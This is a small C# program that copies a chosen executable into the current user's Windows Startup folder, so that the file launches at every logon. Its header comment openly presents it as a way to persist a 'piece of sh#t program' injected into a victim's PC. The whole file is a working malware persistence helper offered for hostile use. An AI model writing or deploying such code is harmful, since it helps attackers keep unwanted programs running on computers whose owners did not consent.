// this simple program moves a file of any sort, most likely a .exe into the windows start folder of the unfortunate soul
// who got a piece of sh#t program injected in their pc. ;D

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;

namespace MoveEXE
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            string filePath = string.Empty;
            string filename = string.Empty;

            string userName = Environment.UserName;
            string pathS = @"C:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.InitialDirectory = "c:\\";
                openFileDialog.Filter = "exe files (*.exe)|*.exe|All files (*.*)|*.*";
                openFileDialog.FilterIndex = 2;
                openFileDialog.RestoreDirectory = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    //Get the path of specified file
                    filePath = openFileDialog.FileName;
                    filename = Path.GetFileName(filePath);
                    filePath = Path.GetDirectoryName(filePath);
                }
            }

            string sourceFile = System.IO.Path.Combine(filePath, filename);
            string destFile = Path.Combine(pathS, filename);

            System.IO.Directory.CreateDirectory(pathS);

            // To copy a file to another location and 
            // overwrite the destination file if it already exists.
            System.IO.File.Copy(sourceFile, destFile, true);
        }
    }
}
